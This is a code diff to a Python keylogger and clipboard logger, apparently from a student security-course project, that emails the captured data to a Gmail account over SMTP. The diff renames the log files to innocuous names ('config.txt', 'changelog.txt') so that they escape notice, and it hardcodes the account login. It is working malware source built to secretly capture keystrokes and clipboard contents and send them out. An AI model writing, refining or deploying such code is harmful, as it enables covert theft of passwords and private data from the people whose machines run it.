@@ -13,7 +13,7 @@ from multiprocessing import Process, freeze_support
 
 # Keyboard logger
 def on_press(key):
-    with open("log.txt", "a") as log:
+    with open("config.txt", "a") as log:
         try:
             log.write(key.char + "\n")
             print(key.char)
@@ -33,7 +33,7 @@ def keylogger():
 def cliplogger():
     while True:
         clip = waitForNewPaste()
-        with open("cliplog.txt", "a") as cliplog:
+        with open("changelog.txt", "a") as cliplog:
             cliplog.write(clip + "\n")
             print(clip)
 
@@ -69,18 +69,11 @@ def send_logs():
     msg.attach(part1)
     msg.attach(part2)
 
-    # Get the password
-    with open("password.txt", "r") as fp:
-        password = fp.read()
-    # Get the email
-    with open("email.txt", "r") as fp:
-        email = fp.read()
-
     # Send email
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.ehlo()
     server.starttls()
-    server.login(email, password)
+    server.login("scruffy.comp6841.sa@gmail.com", "REDACTED")
     server.sendmail("scruffy.comp6841.sa@gmail.com", "scruffy.comp6841.sa@gmail.com", msg.as_string())
 
     # Delete logs
